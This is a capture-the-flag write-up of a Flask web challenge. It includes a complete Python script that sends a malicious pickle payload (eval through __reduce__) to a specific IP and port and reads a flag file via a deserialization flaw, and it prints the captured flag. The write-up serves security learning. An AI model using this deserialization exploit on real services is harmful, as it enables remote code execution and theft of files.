This is a web challange so I connected to the web site and the first thing that I checked was the sources of the site. But there was nothing. I saw in the networking tab that it was making a request so I made a request using **curl -X POST http://ip:port > a.html** and I saved the output as a html to have a nice format. I gon ahead an opened it and I got soething. There were some tracebacks and the fact that this web site is powered by flask.

![img](https://raw.githubusercontent.com/L1ghtDream/cyberedu/master/rundown/images/1.png?raw=true)

We also found that the site was running python 2.7 and we had a small portion of the main 

![img](https://raw.githubusercontent.com/L1ghtDream/cyberedu/master/rundown/images/2.png?raw=true)

There we can see that our payload can not contain spaces. This will get out test harder
So I created this scirpt in order to send a valid payload

```
import pickle
import base64
import os
import string
import requests
import time

class Exploit(object):
	def __reduce__(self):
		return (eval, ('eval(open("flag","r").read())', ))

def sendPayload(p):
	newp = base64.urlsafe_b64encode(p).decode()
	headers = {'Content-Type': 'application/yakoo'}
	r = requests.post("http://35.242.253.155:30788/",headers=headers,data=newp)
	return r.text


payload_dec = pickle.dumps(Exploit(), protocol=2)
print(sendPayload(payload_dec))
```

I want to set the inner_payload to **eval(open(flag), 'r').read())** and I got a big output but at the end of it I got **SyntaxError: ('invalid syntax', ('<string>', 1, 4, 'ctf{f94f7baf771dd04b5a9de97bceba8fc120395c04f10a26b90a4c35c96d48b0bb}'))** here is the flag **ctf{f94f7baf771dd04b5a9de97bceba8fc120395c04f10a26b90a4c35c96d48b0bb}**
